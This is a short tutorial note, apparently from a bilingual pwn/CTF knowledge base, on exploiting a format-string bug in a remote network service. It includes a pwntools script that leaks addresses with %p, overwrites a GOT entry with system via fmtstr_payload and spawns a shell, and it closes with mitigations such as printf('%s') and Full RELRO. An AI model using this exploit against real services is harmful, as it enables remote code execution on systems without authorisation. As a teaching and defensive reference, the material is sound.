---
topic: Format string in a remote service
tags: [pwn, format-string, got, remote, exploit]
---

# Format string in a remote service

[🌐 Español](remote-format-string-service.md) | **English**

## Concept

If a network service passes client data to `printf` as the format, stack addresses can be read and memory written with `%n`. On a non-PIE binary, target the GOT to replace a function with `system`.

## When it applies

- The service echoes or logs input with `printf(input)`.
- The binary is non-PIE or a libc address leaks.
- A later call to `puts`, `printf` or `strlen` exists.

## Procedure

1. Send repeated `%p` and locate the buffer position.
2. Leak `puts` from the GOT or the stack.
3. Compute the libc base and the `system` address.
4. Write `system` with `%n` in two halves and trigger the call.

```python
from pwn import *
p = remote('<IP>', 9999)
p.sendline(b'%p.' * 20)
leak = p.recvline()
# localizar el offset del buffer y la dirección de puts
# escribir system en la GOT con fmtstr_payload
payload = fmtstr_payload(offset, {puts_got: system_addr})
p.sendline(payload)
p.sendline(b'; /bin/sh')
p.interactive()
```

## Variants

- Overwrite `__stack_chk_fail` or a return pointer.
- Use `%s` to read arbitrary memory.
- Chain with ROP if the GOT is read-only.

## Limitations

- The offset must be stable.
- Full RELRO prevents GOT writes.
- Payload length may be limited.

## Mitigation and detection

- Use `printf("%s", input)` and `-Wformat-security`.
- Compile with Full RELRO, PIE and NX.
- Validate and limit network input.

## References

- <https://owasp.org/www-community/attacks/Format_string_attack>
- <https://ir0nstone.gitbook.io/notes/types/stack/format-string>
- <https://attack.mitre.org/techniques/T1203/>
